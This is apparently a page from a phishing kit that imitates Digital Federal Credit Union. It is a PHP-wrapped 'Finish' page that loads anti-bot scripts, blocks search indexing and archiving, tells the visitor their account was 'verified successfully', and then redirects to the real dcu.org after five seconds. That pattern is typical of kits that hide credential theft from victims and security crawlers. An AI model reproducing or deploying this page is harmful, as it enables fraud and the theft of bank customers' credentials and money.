<?php

session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
    require_once '../Meta/demonTest.php';

  

?>

<html class="yui3-js-enabled wf-opensans-n4-active wf-active">
<div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div>

<head>
	
	
	<link rel="stylesheet" type="text/css" href="files/bootstrap-theme.css">
	<link rel="stylesheet" type="text/css" href="files/bootstrap.css">
	<link rel="stylesheet" type="text/css" href="files/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="files/Global.css">
	<link rel="stylesheet" type="text/css" href="files/square-green.css">
	<style>
	.icheckbox_square-green {
		min-width: 22px;
		margin-right: 5px;
	}
	
	.iradio_square-green {
		min-width: 22px;
		margin-right: 5px;
	}
	</style>
	<meta name="viewport" content="initial-scale=1.000">
	<meta http-equiv="refresh" content="5;url=https://www.dcu.org/">
	<link rel="stylesheet" type="text/css" href="files/updated-fivision-style.css">
	<link rel="stylesheet" type="text/css" href="files/fiVISION_Controls.css">
	<link rel="stylesheet" type="text/css" href="files/dcu-20200326.css">
	
	<meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache">
	
	<title> Finish </title>
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans">
	
	<link type="text/css" id="firefly-css" class="firefly-css" rel="stylesheet" href="https://usassets.cobrowse.pega.com/assets/stylesheets/customer/final/default.css?v=8.6.0">
</head>

<body>
	<form method="post" action="" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'SaveButton_SubmitButton')" id="fiVISIONWebForm" class="centerform">
		<div class="aspNetHidden">
			<input type="hidden" name="rsmRadScriptManager_TSM" id="rsmRadScriptManager_TSM" value=";;System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35:en-US:ba1d5018-bf9d-4762-82f6-06087a49b5f6:ea597d4b:b25378d2">
			<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
			<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
			<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUBMA8WAh4KRm9ybU51bWJlcigpWVN5c3RlbS5JbnQ2NCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CDExNzE2ODU0FgICAQ9kFgICAg9kFgJmD2QWAgIBD2QWAgIHD2QWAgIHD2QWAmYPDxYEHg9Db21tYW5kQXJndW1lbnRlHgtDb21tYW5kTmFtZWVkZGTIiFYOKc9lQC7aDt/aMJhLfPWqyA=="> </div>
		
		<div class="aspNetHidden">
			<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="BEFE4D85">
			<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="ymodmMQJ5e1Hut5Bl1T52GEw0yqrKXrjU9-zE5lhuOPnhuqkSszPEsYJSHvQmJtWagMx2JPuh9AAAbK84_fZQjuXy9KB9zXOuyxjROADR22B2ujE0">
			<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAK1zVrrTJv05h4ub9bh92BMjlO+UL0SEPt8QhSFz5v9g/1Eai8VZzkGXRUDYAkQj63eJ8DZ"> </div>
		<span><!-- fiVISON_Layout_Begin --><meta name="format-detection" content="telephone=no">


<div id="BackgroundDiv">
<div id="SizeDiv">
  
<!-- NEW HEADER -->
	
	<header class="navbar-fixed-top">
		 
	 	<div class="brand-header--nav">
			
			<div>
            		
				<nav class="brand-header--nav__secondary">
						
					 <div class="container"> 
                		
						<ul class="brand-header--nav__secondary--level-one" role="list">
							<li role="listitem">
										<a href="" aria-label="Branch Locator" aria-expanded="false" role="link" title="Find a DCU branch or ATM" target="_blank">Branch/ATM Locator</a>
							</li>
							
							<span class="seprator"></span>
		<li role="listitem"> <a href="" aria-label="Contact Us" role="link" target="_blank">Contact Us</a> </li>
		</ul>
		</div>
		</nav>
		</div>
		</div>
		<nav class="brand-header--navbar__nav container clearfix">
			<a href="" class="nav-brand" target="_self"> <img src="files/DCUGreen.svg" role="img" alt="Digital Federal Credit Union" aria-label="Digital Federal Credit Union" title="Digital Federal Credit Union"> </a>
			<div class="title" role="heading">
				<br><span class="highlight"></span></div>
		</nav>
		</header>
		<!-- END NEW HEADER -->
		<div class="container clearfix">
			<!-- CART CODE -->
			<table class="cart">
				<tbody>
					<tr>
						<td width="15%">
							<!-- fiVISON_Control_Begin: fiVISION_ShoppingCart -->
							<!-- fiVISON_Control_End: fiVISION_ShoppingCart -->
						</td>
					</tr>
				</tbody>
			</table>
			<!-- END CART CODE -->
			<div class="col-sm-12 offset-sm-0 col-md-8 offset-md-2 pb-1">
				<!-- fiVISON_Control_Begin: fiVISION_PageContent --><span><!-- fiVISON_PageContent_Begin -->
<br>
<!-- fiVISON_Control_Begin: fiVISION_ErrorSummary --><span id="ErrorSummary1"><div id="ctl13" class="errors" style="display:none;">

</div></span>
				<!-- fiVISON_Control_End: fiVISION_ErrorSummary -->
				<div class="alert">
					<p><span class="alert-title">Thank You</span>
						<br> Your account has been verified successfully.
						<br> </p>
				</div>
				<br>
				<center>
					<!-- fiVISON_Control_Begin: fiVISION_ButtonV2 --><span id="btnNext"><input type="button" name="btnNext$btnNext_SubmitButton" value=" FINISH " onclick="try {if (!Page_ClientValidate() || !FivisionValidate()){ return false; }} catch(err) { } this.disabled = true; this.value = window.$Fivi.LanguageServices._PROCESSING;WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;btnNext$btnNext_SubmitButton&quot;, &quot;&quot;, false, &quot;&quot;, &quot;/dcu/OARD/sessiontimeout.aspx?SessionRedirect=true&quot;, false, true))" id="btnNext_SubmitButton" class="app-primary" originaltext=" Restart Application " style="width:125px;"></span>
					<!-- fiVISON_Control_End: fiVISION_ButtonV2 -->
				</center>
				<!-- fiVISON_PageContent_End -->
				</span>
				<!-- fiVISON_Control_End: fiVISION_PageContent -->
				<!-- fiVISON_Control_Begin: fiVISION_Panel -->
				<!-- fiVISON_Control_End: fiVISION_Panel -->
			</div>
		</div>
		<!-- FOOTER AREA-->
		<footer class="FooterLarge">
			<div class="row">
				<div class="FooterText col-xs-8 py-2">
					<div class="my-xs-1">
						<p>All content ©
							<!-- fiVISON_Control_Begin: fiVISION_Label --><span id="lblLabelDate"><span id="lblLabelDate_Label">2022</span></span>
							<!-- fiVISON_Control_End: fiVISION_Label --><strong>Digital Federal Credit Union</strong></p>
					</div>
				</div>
				<div class="footer-icons col-xs-4">
					<div class="my-xs-1">
						<a href="https://www.dcu.org/streetwise/howto/ncua.html" onclick="return false;" target="_blank" re_target="_blank"><img alt="National Credit Union Association" src="files/ncua.svg"></a> <img alt="Equal Housing Lender" src="files/equal-housing.svg"> </div>
				</div>
			</div>
		</footer>
		</div>
		</div>
		<!-- fiVISON_Control_Begin: fiVISION_AccordionHelper --><span><script type="text/javascript">
                            var arrowIcon=''; // opened title
                            function changeArrowDirection(obj){
                                // first set all to 'right', then we'll set the right one to 'down'
                                $('.panel-heading').each(function(index) {
                                    let thisArrow = $(this).find('.panelArrow');
                                    thisArrow.removeClass('fa-caret-down');
                                      thisArrow.addClass('fa-caret-right');
                                });
        
                                let panelArrow = $(obj).find('.panelArrow');
                                if(arrowIcon != '' && $(arrowIcon).attr('data-target') == $(obj).attr('data-target')) {
                                    arrowIcon = '';
                                    panelArrow.removeClass('fa-caret-down');
                                      panelArrow.addClass('fa-caret-right');
                                }
                                else {
                                    panelArrow.removeClass('fa-caret-right');
                                    panelArrow.addClass('fa-caret-down');
                                    arrowIcon = obj;
                                }
                            }
    
                            function prependArrow(){
                                $('#accordion .panel-title').prepend("<i class='panelArrow fa fa-caret-right fa-lg' style='float:left' aria-hidden='true'>&nbsp;</i>");
                            }
                          
                            $(document).ready(function () {
                                prependArrow();

                                $('.panel-heading').each(function(index) {
                                    var x = $(this).find('.panelArrow');
                                    x.attr('tabIndex', '0');
                                    $(this).on('keydown', function(e) {
                                        switch(e.which) {
                                            case 32 :  // space
                                                x.click();
                                                e.preventDefault();
                                                break;
                                            case 37 :  // left
                                                x.click();
                                                e.preventDefault();
                                                break;
                                            case 38 :  // up
                                                x.click();
                                                e.preventDefault();
                                                break;
                                            case 39 :  // right
                                                x.click();
                                                e.preventDefault();
                                                break;
                                            case 40 :  // down
                                                x.click();
                                                e.preventDefault();
                                                break;
                                        }
                                    });
                                    $(this).on('click', function() {
                                        changeArrowDirection(this);
                                    });
                                });
        
                                // specific to Select Accounts page
                                var act = 0;
                                if ($.cookie('fivi_select_accounts') != null) {
                                    act =  $.cookie('fivi_select_accounts');
                                }
                
                                if (act!= null && act!= 0) {
                                    var cookieTab = $('#'+act).parent().find('.panel-heading');
                                    changeArrowDirection(cookieTab);
                                }
                            });
                        </script></span>
		<!-- fiVISON_Control_End: fiVISION_AccordionHelper -->
		<!-- fiVISON_Layout_End -->
		</span>
		<script type="text/javascript">
		//<![CDATA[
		var Page_ValidationSummaries = new Array(document.getElementById("ctl13"));
		//]]>
		</script>
		<script type="text/javascript">
		//<![CDATA[
		$(document).ready(function() {
			var dataToPost = {
				URI: "Session.SessionServices.Ping",
				JSONArgument: {
					PageVisisted: document.location.href,
				}
			}
			$.ajax({
				type: "POST",
				url: "api.aspx",
				data: JSON.stringify(dataToPost),
				dataType: "json",
			}).done(function(response) {
				SessionPingCompleteSuccess(response.Data);
			}).fail(function(jqXHR, textStatus, errorThrown) {
				// do something?
			});
		});

		function SessionPingCompleteSuccess(response) {
			if(response.IsValidNextPage == false) {
				var elems = document.getElementsByTagName('input');
				var len = elems.length;
				for(var i = 0; i < len; i++) {
					elems[i].disabled = true;
				}
				window.location = response.RedirectUrl;
			}
		}
		(function(id) {
			var e = document.getElementById(id);
			if(e) {
				e.dispose = function() {
					Array.remove(Page_ValidationSummaries, document.getElementById(id));
				}
				e = null;
			}
		})('ctl13');
		//]]>
		</script>
	</form>
	<script>
	$(document).ready(function() {
		$('[data-toggle="tooltip"]').tooltip({
			html: true,
			viewport: {
				selector: 'body',
				padding: 2
			}
		});
	});
	</script>
</body>

</html>